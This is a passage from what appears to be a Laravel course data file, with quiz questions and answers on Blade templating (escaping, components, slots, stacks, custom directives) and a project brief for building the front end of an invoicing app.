        "`{{ }}` only handles strings",
        "None",
      ],
      correctIndex: 1,
      explanation: "Escaping is what stops a user's input executing as markup.",
    },
    {
      question: "Why is `{!! $userInput !!}` dangerous?",
      options: [
        "It is slow",
        "It breaks caching",
        "The browser runs any script the user typed, for every visitor",
        "It double-escapes",
      ],
      correctIndex: 2,
      explanation: "That is cross-site scripting.",
    },
    {
      question: "How should you pass a PHP value into a `<script>` block?",
      options: [
        "`\"{{ $value }}\"`",
        "`{!! $value !!}`",
        "`@php`",
        "`@json($value)`",
      ],
      correctIndex: 3,
      explanation: "`{{ }}` escapes for HTML, which is the wrong encoding for JavaScript.",
    },
    {
      question: "Why default to `@forelse` over `@foreach`?",
      options: [
        "It is faster",
        "It handles nesting",
        "It supports `$loop`",
        "The empty case is part of the same block, so it cannot be forgotten",
      ],
      correctIndex: 3,
      explanation: "Otherwise an empty list renders a header above nothing.",
    },
    {
      question: "What does `$loop->last` help you avoid?",
      options: [
        "A trailing comma when joining items",
        "Nested loops",
        "Extra queries",
        "Escaping issues",
      ],
      correctIndex: 0,
      explanation: "No manual counter needed.",
    },
    {
      question: "Where is `$loop` available?",
      options: [
        "Anywhere in a Blade file",
        "Only in components",
        "Only inside Blade's loop directives",
        "Only in layouts",
      ],
      correctIndex: 2,
      explanation: "A raw `@php foreach` block has no `$loop`.",
    },
    {
      question: "In template inheritance, what does `@yield('content')` do?",
      options: [
        "Defines content",
        "Includes a view",
        "Marks where the child's matching `@section` is inserted",
        "Creates a component",
      ],
      correctIndex: 2,
      explanation: "The layout pulls content from named sections.",
    },
    {
      question: "How does a page pass its main content to a component layout?",
      options: [
        "As `$slot`",
        "`@yield`",
        "`@include`",
        "`@section`",
      ],
      correctIndex: 0,
      explanation: "Everything between the tags becomes `$slot`.",
    },
    {
      question: "What does `@parent` do inside a section?",
      options: [
        "Keeps the layout's version and adds to it",
        "Extends the layout",
        "Calls the parent controller",
        "References the outer loop",
      ],
      correctIndex: 0,
      explanation: "Useful for adding to a default sidebar rather than replacing it.",
    },
    {
      question: "What is the difference between `type=\"error\"` and `:type=\"$status\"`?",
      options: [
        "None",
        "The colon passes a PHP expression rather than a literal string",
        "The colon escapes it",
        "The colon is for class components",
      ],
      correctIndex: 1,
      explanation: "Which is why booleans need the colon.",
    },
    {
      question: "Why does `dismissible=\"false\"` not behave as expected?",
      options: [
        "Blade cannot parse it",
        "Booleans are unsupported",
        "It needs `@props`",
        "It passes the truthy string \"false\"",
      ],
      correctIndex: 3,
      explanation: "Use `:dismissible=\"false\"` to pass an actual boolean.",
    },
    {
      question: "What does `$attributes->merge(['class' => 'alert'])` do?",
      options: [
        "Combines the component's defaults with what the caller passed",
        "Validates them",
        "Escapes them",
        "Replaces caller attributes",
      ],
      correctIndex: 0,
      explanation: "That is what lets a caller add `class=\"mt-4\"` without you anticipating it.",
    },
    {
      question: "What tag does a component class named `InvoiceStatus` produce?",
      options: [
        "`<x-InvoiceStatus>`",
        "`<x-invoice_status>`",
        "`<x-invoice-status>`",
        "`<x-invoicestatus>`",
      ],
      correctIndex: 2,
      explanation: "StudlyCase class names become kebab-case tags.",
    },
    {
      question: "What is the main difference between `@include` and a component?",
      options: [
        "An include inherits all parent variables; a component receives only what you pass",
        "Speed",
        "Includes cannot take data",
        "Components cannot nest",
      ],
      correctIndex: 0,
      explanation: "Which is why an include can break when moved to another page.",
    },
    {
      question: "What does `@stack('scripts')` do?",
      options: [
        "Pushes a script",
        "Declares where pushed content is rendered in the layout",
        "Caches scripts",
        "Loads every script",
      ],
      correctIndex: 1,
      explanation: "Pages and components push into it with `@push`.",
    },
    {
      question: "A component used five times pushes its script five times. What fixes it?",
      options: [
        "`@prepend`",
        "`@includeFirst`",
        "`@each`",
        "`@once` or `@pushOnce`",
      ],
      correctIndex: 3,
      explanation: "It renders its contents a single time per request.",
    },
    {
      question: "When does the closure given to `Blade::directive` run?",
      options: [
        "Every render",
        "At compile time, returning a string of PHP code",
        "At boot",
        "In production only",
      ],
      correctIndex: 1,
      explanation: "It cannot inspect the value, because the value does not exist yet.",
    },
    {
      question: "What must you run after changing a custom directive?",
      options: [
        "`composer dump-autoload`",
        "`php artisan view:clear`",
        "`route:clear`",
        "Nothing",
      ],
      correctIndex: 1,
      explanation: "Compiled templates still hold the old generated PHP.",
    },
    {
      question: "What is the drawback of a view composer?",
      options: [
        "It is slow",
        "It only works on layouts",
        "It breaks caching",
        "A template gains a variable with nothing in the controller to explain it",
      ],
      correctIndex: 3,
      explanation: "Which is why they suit genuinely global data.",
    },
  ],
  project: {
    name: "InvoiceHub",
    goal: "Give it a real front end: a layout, components and a proper empty state.",
    brief: "Every InvoiceHub page so far has been bare markup, and the Blade files repeat each other. Today you build the presentation layer properly.\n\nThis is the last day before the database arrives, so it is worth doing well: the layout and components you build now are what every later feature renders into. Pick one layout style and stay with it.",
    steps: [
      "Create `resources/views/components/layout.blade.php` as a component layout with a `$title` prop, a `$slot`, and `@stack('styles')` in the head plus `@stack('scripts')` before `</body>`. Convert every existing view to `<x-layout>`.",
      "Build `<x-invoice-status :status=\"...\" />` as a class component. The class picks the colour with a `match`; the template just renders the badge. Use it in both the list and the detail page.",
      "Build an anonymous `<x-alert type=\"...\">` component using `@props` and `$attributes->merge()`, and use it for your flash messages. Confirm `<x-alert class=\"mt-4\">` merges rather than replaces the class.",
      "Deliberately pass `dismissible=\"false\"` without the colon and watch the dismiss button appear anyway. Then fix it with `:dismissible=\"false\"`.",
      "Convert your invoice table rows to `@forelse` with a real empty state, so a fresh install shows a message rather than an empty table.",
      "Use `$loop->even` for zebra striping and `$loop->last` to join the line-item descriptions without a trailing comma.",
      "Build `<x-card>` with named `header` and `footer` slots, both guarded by `@isset`, and use it for the invoice detail page.",
      "Add a `@money` directive in `AppServiceProvider::boot()` and use it for every amount. Change the format, reload, and see nothing happen. Then run `php artisan view:clear` and watch it update.",
      "Add a chart or date picker script to the invoice page with `@push('scripts')`, and make one component push its own asset with `@pushOnce`. Render that component twice and confirm the tag appears once.",
      "Open `storage/framework/views/` and read one compiled template. Find your `{{ }}` turned into `echo e(...)` and your `@if` turned into a PHP `if`.",
    ],
    acceptance: [
      "Every page renders through one layout, and the shell HTML exists in exactly one file.",
      "A fresh install with no invoices shows a real message, not an empty table.",
      "`<x-alert class=\"mt-4\">` renders with both the component's classes and yours.",
      "The `@money` directive works, and you can explain why `view:clear` was needed after changing it.",
      "A component rendered twice pushes its script once.",
      "You have read a compiled Blade file and can point at the `e()` call that escapes your output.",
      "No template runs a query or does arithmetic. All of it is in the controller or a service.",
    ],
    stretch: [
      "Add a view composer supplying a draft-invoice count to the layout, then decide whether the convenience was worth the invisible variable.",
      "Build the same layout again using `@extends` and `@yield` in a branch, and compare which you prefer before committing to one.",
      "Add `Blade::if('admin', ...)` and use `@admin` to show an admin link.",
    ],
  },
};
